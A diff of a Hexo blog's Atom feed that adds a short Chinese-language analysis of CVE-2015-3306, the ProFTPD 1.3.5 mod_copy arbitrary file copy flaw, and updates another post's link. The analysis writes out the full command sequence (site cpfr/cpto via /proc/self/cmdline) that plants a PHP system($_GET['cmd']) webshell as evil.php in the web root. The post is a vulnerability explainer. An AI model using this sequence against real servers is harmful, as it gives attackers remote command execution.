@@ -6,7 +6,7 @@
   <link href="https://yoloyolo.top/atom.xml" rel="self"/>
   
   <link href="https://yoloyolo.top/"/>
-  <updated>2021-01-14T12:02:44.162Z</updated>
+  <updated>2021-01-14T12:19:56.098Z</updated>
   <id>https://yoloyolo.top/</id>
   
   <author>
@@ -17,9 +17,29 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>Ez_Analysis_For_CVE-2015-3306</title>
+    <link href="https://yoloyolo.top/2021/01/14/EZ-Analysis-For-CVE-2015-3306/"/>
+    <id>https://yoloyolo.top/2021/01/14/EZ-Analysis-For-CVE-2015-3306/</id>
+    <published>2021-01-14T12:17:21.000Z</published>
+    <updated>2021-01-14T12:19:56.098Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="CVE-2015-3306-浅析"><a href="#CVE-2015-3306-浅析" class="headerlink" title="CVE-2015-3306 浅析"></a>CVE-2015-3306 浅析</h1><p>ProFTPD 1.3.5 mod_copy RCE</p><p>该漏洞的描述如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The mod_copy module in ProFTPD 1.3.5 allows remote attackers to read and write to arbitrary files via the site cpfr and site cpto commands.</span><br><span class="line">ProFTPD 1.3.5中的mod_copy模块允许远程入侵者通过site cpfr和site cpto命令进行任意文件读写</span><br></pre></td></tr></table></figure><p>基于任意文件读写的操作，可以将目标机器上的一些敏感信息文件拷贝至可访问路径(WEB路径/SMB路径/etc.)来进行读取</p><p>甚至可以进行写入WebShell的操作，操作如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">site cpfr &#x2F;proc&#x2F;self&#x2F;cmdline</span><br><span class="line"></span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php</span><br><span class="line">site cpfr &#x2F;var&#x2F;www&#x2F;html&#x2F;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php</span><br><span class="line">site cpto &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.php</span><br></pre></td></tr></table></figure><hr /><h1 id="proc-pid-cmdline"><a href="#proc-pid-cmdline" class="headerlink" title="/proc/[pid]/cmdline"></a>/proc/[pid]/cmdline</h1><ul><li>/proc/[pid]/cmdline<br>This read-only file holds the complete command line for theprocess, unless the process is a zombie.</li></ul><p>进程在执行命令之前会从该文件获取命令，所以ftp进程在执行 <code>site cpto /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php</code> 时<br><code>/proc/self/cmdline</code> 中的内容已经变成了 <code>10.100.120.31:57420: SITE cpto /var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php</code><br>即拷贝这段内容至 <code>/var/www/html/&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;.php</code><br>后面两条命令的操作即为修改文件名<br>即可以使用该漏洞来进行WebShell的写入操作</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;CVE-2015-3306-浅析&quot;&gt;&lt;a href=&quot;#CVE-2015-3306-浅析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2015-3306 浅析&quot;&gt;&lt;/a&gt;CVE-2015-3306 浅析&lt;/h1&gt;&lt;p&gt;ProFTPD 1.3.5 </summary>
+      
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>PHP反序列化字符串逃逸</title>
-    <link href="https://yoloyolo.top/2021/01/14/PHP_Unserialize/"/>
-    <id>https://yoloyolo.top/2021/01/14/PHP_Unserialize/</id>
+    <link href="https://yoloyolo.top/2021/01/14/PHP-Unserialize-String-Escape/"/>
+    <id>https://yoloyolo.top/2021/01/14/PHP-Unserialize-String-Escape/</id>
     <published>2021-01-14T10:58:23.000Z</published>
     <updated>2021-01-14T12:02:44.162Z</updated>
     
